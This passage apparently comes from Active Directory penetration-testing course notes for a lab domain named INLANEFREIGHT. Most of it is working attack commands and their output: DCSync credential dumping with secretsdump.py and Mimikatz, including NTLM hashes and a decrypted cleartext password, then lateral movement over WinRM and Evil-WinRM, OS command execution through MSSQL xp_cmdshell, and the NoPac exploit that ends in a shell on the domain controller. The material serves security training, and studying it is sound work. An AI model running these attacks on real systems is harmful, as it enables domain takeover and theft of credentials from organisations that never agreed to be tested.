$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

**Explanation:**
- `secretsdump.py` from the Impacket toolkit contacts the Domain Controller and requests credential data by impersonating a replication partner using `adunn`'s credentials.
- `-outputfile inlanefreight_hashes` — saves output to files prefixed with `inlanefreight_hashes` in the current directory.
- `-just-dc` — extracts only NTLM hashes and Kerberos keys from NTDS (skips SAM/LSA).
- The output format is `domain\username:RID:LMhash:NThash:::` — the NT hash (last field before `:::`) is what is used for Pass-the-Hash or cracking.
- A cleartext password for `proxyagent` also appears — this account has **reversible encryption** enabled (covered in section 4.4).
- Additional useful flags:
  - `-just-dc-ntlm` — output only NTLM hashes (no Kerberos keys)
  - `-just-dc-user <USERNAME>` — dump a single user only
  - `-pwd-last-set` — show when each account's password was last changed
  - `-history` — include previous password hashes (useful for offline cracking and password strength reporting)
  - `-user-status` — show whether accounts are enabled or disabled (useful for filtering disabled accounts from reporting metrics)

---

### Listing the Output Files — Hashes, Kerberos Keys, and Cleartext Passwords

If we check the files created using the `-just-dc` flag, we will see that there are three output files:

```bash
$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

**Explanation:**
- Three output files are generated from the `-just-dc` flag:
  - `inlanefreight_hashes.ntds` — all NTLM hashes in `domain\user:RID:LMhash:NThash:::` format.
  - `inlanefreight_hashes.ntds.kerberos` — Kerberos AES256/AES128/DES keys for all accounts.
  - `inlanefreight_hashes.ntds.cleartext` — cleartext passwords for any accounts with reversible encryption enabled.
- These files are the primary deliverable of the DCSync attack and can be used for Pass-the-Hash, offline cracking, or credential re-use testing across the environment.

---

## 20.4 Checking for Reversible Encryption

When reversible encryption is enabled on a user account, it does **not** mean passwords are stored in plaintext. Instead, they are stored using **RC4 encryption**. The key needed to decrypt them is stored in the registry (the **Syskey**) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will automatically decrypt these passwords while performing DCSync. If this setting is later disabled on an account, the user must change their password before it is stored using one-way encryption. Any passwords set while this setting is enabled will remain stored using reversible encryption until changed.

This setting is typically configured to support applications that use protocols requiring access to the user's plaintext password for authentication purposes.

### Viewing an Account with Reversible Encryption Password Storage Set

This setting is visible in Active Directory Users and Computers under the **Account** tab of the user's properties — the checkbox **"Store password using reversible encryption"** will be ticked. While rare, we see accounts with this setting from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

When this option is set on a user account, it does **not** mean that the passwords are stored in cleartext. Instead, they are stored using **RC4 encryption**. The trick here is that the key needed to decrypt them is stored in the registry (the **Syskey**) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed.

### Enumerating Further using Get-ADUser

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

**Explanation:**
- `-Filter 'userAccountControl -band 128'` — the `-band` operator performs a bitwise AND check. The value `128` corresponds to the `ENCRYPTED_TEXT_PWD_ALLOWED` flag in the `userAccountControl` bitmask.
- The output reveals that the `proxyagent` service account has this flag set — `userAccountControl: 640` = `NORMAL_ACCOUNT (512) + ENCRYPTED_TEXT_PWD_ALLOWED (128)`.
- This confirms which accounts will have cleartext passwords visible in the `.ntds.cleartext` file after DCSync.

---

### Checking for Reversible Encryption Option using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

**Explanation:**
- PowerView's `Get-DomainUser` with the `useraccountcontrol` filter provides a more human-readable output than `Get-ADUser`.
- The filter `*ENCRYPTED_TEXT_PWD_ALLOWED*` matches any account where that flag is present in the string representation of the `userAccountControl` field.
- Confirms `proxyagent` is the account with reversible encryption — consistent with what `secretsdump.py` already revealed.

---

### Displaying the Decrypted Password

```bash
$ cat inlanefreight_hashes.ntds.cleartext

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

**Explanation:**
- The `.ntds.cleartext` file contains the decrypted passwords for all accounts with reversible encryption enabled.
- The format is `username:CLEARTEXT:password`.
- The password `Pr0xy_ILFREIGHT!` was decrypted automatically by `secretsdump.py` using the Syskey extracted from the target's registry during execution.
- This cleartext password can be used immediately for authentication without any cracking. Always test it for password re-use across other accounts and services in the environment.
- Some organizations enable reversible encryption for **all** user accounts to allow periodic NTDS audits without offline cracking — an extremely risky practice that provides attackers with ready-to-use credentials directly from DCSync.

---

## 20.5 Performing DCSync with Mimikatz (Windows)

We can perform the DCSync attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in **administrator** account. We could also target the `krbtgt` account and use this to create a **Golden Ticket** for persistence, but that is outside the scope of this module.

It is important to note that **Mimikatz must be run in the context of the user who has DCSync privileges** (`adunn` in this case). We cannot just open Mimikatz as our current unprivileged user — it needs to authenticate as `adunn` when making replication requests to the DC. We use `runas.exe` to accomplish this.

### Using runas.exe

```cmd
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

**Explanation:**
- `runas /netonly` — launches a new process using the specified credentials **only for network authentication**. The process runs locally as the current user but uses `adunn`'s credentials for any network operations (like contacting the DC for DCSync).
- `/user:INLANEFREIGHT\adunn` — specifies the user context for network authentication.
- `powershell` — the process to launch. After entering `adunn`'s password (obtained from cracking the Kerberoasted hash), a new PowerShell window opens where all network calls authenticate as `adunn`.

---

### Performing the Attack with Mimikatz

From the newly spawned PowerShell session (running in the context of `adunn` for network auth), we can perform the attack:

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

**Explanation:**
- `privilege::debug` — requests the `SeDebugPrivilege` right, which Mimikatz needs to interact with privileged processes for DCSync.
- `lsadump::dcsync` — the Mimikatz module that performs the DCSync attack by making RPC/DRSUAPI calls to the Domain Controller.
- `/domain:INLANEFREIGHT.LOCAL` — specifies the target domain. Required when the current session's domain differs from the target domain.
- `/user:INLANEFREIGHT\administrator` — the account whose credential data to retrieve. Can be any domain account — including `krbtgt` for Golden Ticket creation.
- The output under `Credentials:` shows `Hash NTLM: 88ad09182de639ccc6579eb0849751cf` — the NT hash of the Administrator account, ready for Pass-the-Hash or offline cracking.

---

# 21. Privileged Access

## 21.1 Overview of Lateral Movement Methods

Once a foothold is established in the domain, the goal shifts to lateral movement and privilege escalation. Typically, if we take over an account with local admin rights over a host or set of hosts, we can perform a **Pass-the-Hash** attack to authenticate via the SMB protocol. But what if we don't yet have local admin rights on any hosts in the domain? There are several other ways we can move around a Windows domain:

- **Remote Desktop Protocol (RDP)** — A remote access/management protocol that gives us GUI access to a target host.
- **PowerShell Remoting (PSRemoting / WinRM)** — A remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell.
- **MSSQL Server** — An account with sysadmin privileges on a SQL Server instance can log in remotely and execute queries. This access can be used to run OS commands in the context of the SQL Server service account.

BloodHound can visualize the following edge types for identifying remote access rights:

- **CanRDP** — Remote Desktop Protocol access
- **CanPSRemote** — PowerShell Remoting / WinRM access
- **SQLAdmin** — SQL Server sysadmin privileges

> **Scenario Setup:** This section moves between a Windows and Linux attack host. RDP into MS01 (`htb-student:Academy_student_AD!`). For Linux portions (mssqlclient.py and evil-winrm), SSH to `172.16.5.225` with credentials `htb-student:HTB_@cademy_stdnt!`. Try all methods — `Enter-PSSession` and `PowerUpSQL` from Windows, and `evil-winrm` and `mssqlclient.py` from Linux.

---

## 21.2 Remote Desktop (RDP) Access

RDP access with a non-admin user is still valuable — it allows launching further attacks, escalating privileges, and pillaging the host for sensitive data or credentials. The first thing to check after importing BloodHound data is: **Does the Domain Users group have local admin rights or execution rights (RDP or WinRM) over one or more hosts?**

### Enumerating the Remote Desktop Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

**Explanation:**
- `Get-NetLocalGroupMember` queries the members of a local group on a remote computer.
- `-GroupName "Remote Desktop Users"` retrieves all accounts with RDP access to that machine.
- The output shows **all Domain Users** can RDP to this host — a significant misconfiguration common on RDS hosts or jump boxes. This type of server may hold sensitive data or offer a local privilege escalation path.

---

### BloodHound Queries for RDP Rights

In BloodHound, use:
- **Analysis tab** → `Find Workstations where Domain Users can RDP`
- **Analysis tab** → `Find Servers where Domain Users can RDP`
- **Node Info tab** → **Execution Rights** to view a specific user's RDP rights (direct or via group membership)

To test RDP access, use `xfreerdp` or `Remmina` from Linux, or `mstsc.exe` from a Windows host.

---

## 21.3 WinRM / PowerShell Remoting Access

### Enumerating the Remote Management Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

**Explanation:**
- The **Remote Management Users** group was introduced in Windows 8/Server 2012 to grant WinRM access without requiring local admin rights.
- The output shows the user `forend` has WinRM access to MS01.

---

### BloodHound Cypher Query for WinRM Users

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Explanation:**
- This custom Cypher query finds all users who can connect via WinRM, either directly or through group membership.
- Paste it into the **Raw Query** box at the bottom of the BloodHound GUI and hit Enter.
- It can be saved as a custom query so it's always available during assessments.

---

### Establishing WinRM Session from Windows

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

**Explanation:**
- Creates a credential object for `forend` and establishes an interactive WinRM session on MS01.
- The `hostname` command confirms we are on the remote host.
- Use `Exit-PSSession` to return to the local session.

---

### Installing Evil-WinRM (Linux)

```bash
$ gem install evil-winrm
```

**Explanation:**
- Installs the Evil-WinRM tool via Ruby's gem package manager.

### Viewing Evil-WinRM's Help Menu

```bash
$ evil-winrm

Evil-WinRM shell v3.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

**Explanation:**
- Key flags: `-i` (target IP), `-u` (username), `-p` (password), `-H` (NT hash for Pass-the-Hash), `-S` (SSL), `-P` (port, default 5985).

---

### Connecting to a Target with Evil-WinRM and Valid Credentials

```bash
$ evil-winrm -i 10.129.201.234 -u forend

Enter Password:

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

**Explanation:**
- Connect with just an IP address and valid credentials — Evil-WinRM prompts for the password.
- A successful connection drops into a PowerShell session on the remote host.

---

## 21.4 SQL Server Admin Access

SQL server credentials are commonly found via **Kerberoasting**, **LLMNR/NBT-NS Response Spoofing**, **password spraying**, or with the tool **Snaffler** which searches for `web.config` or configuration files containing SQL Server connection strings. SQL sysadmin access almost always translates to **SYSTEM-level OS access** via `xp_cmdshell` due to `SeImpersonatePrivilege`.

### BloodHound Cypher Query for SQL Admin Rights

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

**Explanation:**
- This custom Cypher query finds all users with SQLAdmin rights over a computer.
- In the example environment, `damundsen` has SQLAdmin rights over `ACADEMY-EA-DB01`.
- We can use our ACL rights to change `damundsen`'s password and then authenticate to the SQL server.

---

### Enumerating MSSQL Instances with PowerUpSQL

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb> Import-Module .\PowerUpSQL.ps1
PS C:\htb> Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

**Explanation:**
- `Get-SQLInstanceDomain` scans the domain for all SQL Server instances registered via SPNs in Active Directory.
- Output shows `ACADEMY-EA-DB01` is running SQL Server on port 1433, using the `damundsen` service account.

---

### Querying SQL Server Using PowerUpSQL (Get-SQLQuery)

```powershell
PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

**Explanation:**
- `Get-SQLQuery` authenticates to the SQL Server instance and executes the query.
- `Connection Success` confirms valid credentials and connectivity.
- `Select @@version` is a simple test query to confirm the SQL Server version.

---

### Displaying mssqlclient.py Options (Linux)

```bash
$ mssqlclient.py

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

<SNIP>
```

**Explanation:**
- Key flags: `-windows-auth` (use Windows authentication instead of SQL auth), `-hashes` (Pass-the-Hash), `-k` (Kerberos auth), `-no-pass` (use cached credentials).

---

### Running mssqlclient.py Against the Target

```bash
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
```

**Explanation:**
- `-windows-auth` authenticates using Windows credentials (domain\username format).
- Successful connection drops into an SQL prompt.

---

### Viewing Our Options with Access to the SQL Server

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

**Explanation:**
- `help` lists all available mssqlclient.py shell commands.
- `enable_xp_cmdshell` is the key command that enables OS command execution via the database.

---

### Choosing enable_xp_cmdshell

```bash
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

**Explanation:**
- Enables the `xp_cmdshell` stored procedure on the SQL Server.
- This is only possible if the account has sysadmin rights.
- The two INFO lines confirm both `show advanced options` and `xp_cmdshell` were enabled and reconfigured.

---

### Enumerating Our Rights on the System Using xp_cmdshell

```bash
SQL> xp_cmdshell whoami /priv
output

--------------------------------------------------------------------------------

NULL

PRIVILEGES INFORMATION
----------------------

NULL

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

NULL
```

**Explanation:**
- `xp_cmdshell whoami /priv` runs `whoami /priv` on the OS through the SQL Server service account context.
- **`SeImpersonatePrivilege` is Enabled** — this is the critical finding. Combined with tools like **JuicyPotato**, **PrintSpoofer**, or **RoguePotato**, this privilege can be leveraged to escalate to `NT AUTHORITY\SYSTEM` on the host, depending on the OS version.
- These escalation techniques are covered in the **Windows Privilege Escalation module** (SeImpersonate and SeAssignPrimaryToken sections).

---

## 21.5 Moving On — Key Takeaways

This section demonstrated a few possible lateral movement techniques in an Active Directory environment. Key points to remember:

- Always look for RDP, WinRM, and SQLAdmin rights when gaining initial footholds and additional user accounts.
- Enumerating and attacking is an **iterative process** — every time a new user or host is compromised, repeat enumeration steps to identify new rights.
- Never overlook remote access rights even if the user is not a local admin — a WinRM or RDP session may reveal sensitive data or a privilege escalation path.
- Whenever SQL credentials are found (in scripts, `web.config` files, or DB connection strings), always test them against MSSQL servers. SQL sysadmin access is almost always **guaranteed SYSTEM access** over the host via `SeImpersonatePrivilege`.

---

# 22. Kerberos "Double Hop" Problem

## 22.1 Background and Explanation

The "Double Hop" problem is a Kerberos authentication limitation that arises when an attacker attempts to use WinRM/PowerShell to authenticate across two or more systems. When a user authenticates via WinRM using Kerberos, they receive only a TGS (Ticket Granting Service) ticket for that specific service — their TGT (Ticket Granting Ticket) is not forwarded. Without the TGT being cached on the remote system, any subsequent attempt to access a third system (such as a Domain Controller for LDAP queries) fails because Kerberos cannot prove the user's identity for the second hop.

This contrasts with NTLM-based authentication methods like PSExec, where the user's NTLM hash is stored in memory and can be used for further authentication. The double hop problem manifests as errors like "An operations error occurred" when trying to run tools like PowerView from a WinRM session. It is confirmed by running `klist` in the remote session and seeing only one cached ticket (for the current connection), not a full TGT.

---

## 22.2 Workaround #1 — PSCredential Object

When connected via Evil-WinRM, pass credentials explicitly with each command:

```powershell
*Evil-WinRM* PS> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
*Evil-WinRM* PS> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
*Evil-WinRM* PS> get-domainuser -spn -credential $Cred | select samaccountname
```

**Explanation:**
- By creating a `PSCredential` object and passing it with `-Credential $Cred` to PowerView commands, the credentials are explicitly included in the LDAP query to the Domain Controller, bypassing the double hop limitation.
- Without `-Credential`, the same command fails because the WinRM session has no TGT to authenticate with the DC.

---

## 22.3 Workaround #2 — Register PSSession Configuration

This method works when using a proper Windows console (not Evil-WinRM) and creates a persistent session configuration that avoids the double hop issue.

### Register the Session

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

**Explanation:**
- `Register-PSSessionConfiguration` creates a new named session endpoint on the local machine.
- `-RunAsCredential inlanefreight\backupadm` configures the session to run all commands under the specified user's credentials, which are fully cached.
- This triggers a WinRM service restart, disconnecting existing sessions.

---

### Restart WinRM and Connect Using the Named Session

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
```

**Explanation:**
- `-ConfigurationName backupadmsess` tells the system to use the registered session configuration.
- The local machine now impersonates the remote machine in the context of `backupadm`, and the TGT is fully available, as confirmed by running `klist` and seeing a `krbtgt` ticket cached.
- PowerView commands can now be run without `-Credential` flags.

> **Note:** This method cannot be used from an Evil-WinRM shell (requires GUI/elevated PowerShell) and has limitations on Linux attack hosts.

---

# 23. Bleeding Edge Vulnerabilities

## 23.1 Introduction and Safety Considerations

These three vulnerabilities are relatively recent (within 6–9 months of April 2022). They are advanced topics that cannot be covered thoroughly in one section. The purpose is to allow students to practice these attacks in a controlled lab environment. As with any attack, **if you do not understand how these work or the risk they could pose to a production environment, do not attempt them during a real-world engagement.**

These techniques are considered "safe" and less destructive than attacks such as Zerologon or DCShadow, but all attacks carry risk. For example, **PrintNightmare could crash the print spooler service** on a remote host, causing a service disruption. Always exercise caution, take detailed notes, and communicate with clients.

> **Scenario Setup:** All examples are performed from the **ATTACK01 Linux attack host** (SSH in). For Windows-based demonstrations (Rubeus and Mimikatz), use the MS01 host from the Privileged Access section.

---

## 23.2 NoPac (SamAccountName Spoofing) — CVE-2021-42278 & CVE-2021-42287

NoPac exploits two chained CVEs allowing a standard domain user to escalate to Domain Admin in a single command.

| CVE | Description |
|---|---|
| **CVE-2021-42278** | A bypass vulnerability in the Security Account Manager (SAM) |
| **CVE-2021-42287** | A vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS |

The attack works by renaming a newly created computer account to match a Domain Controller's `sAMAccountName`, then requesting Kerberos tickets — the KDC issues a TGT under the DC's name instead of the new name. This grants SYSTEM-level access on the DC. NoPac uses many Impacket tools internally.

### Ensuring Impacket is Installed and Cloning NoPac

```bash
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ python setup.py install
$ git clone https://github.com/Ridter/noPac.git
```

**Explanation:**
- Clones and installs Impacket, then clones the NoPac exploit repository.
- NoPac is present on the ATTACK01 host at `/opt/noPac`.

---

### Scanning for NoPac

```bash
$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

**Explanation:**
- `scanner.py` attempts to obtain a TGT with a PAC from the DC — success means the system is vulnerable.
- `ms-DS-MachineAccountQuota = 10` — authenticated users can add up to 10 computers to the domain, which is required for this attack. If an admin sets this to **0**, the attack fails.

---

### Running NoPac and Getting a Shell

```bash
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*]     Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

**Explanation:**
- `-shell` drops into a semi-interactive shell via `smbexec.py`. Use **exact paths** instead of `cd` since smbexec doesn't support directory navigation.
- `--impersonate administrator` specifies the account to impersonate.
- The tool adds a fake computer account, renames it to match the DC's `sAMAccountName`, requests a TGT under the DC's name, then restores the original name.
- `.ccache` files are saved to disk — usable for pass-the-ticket or DCSync attacks.

---

### Confirming the Location of Saved Tickets

```bash
$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

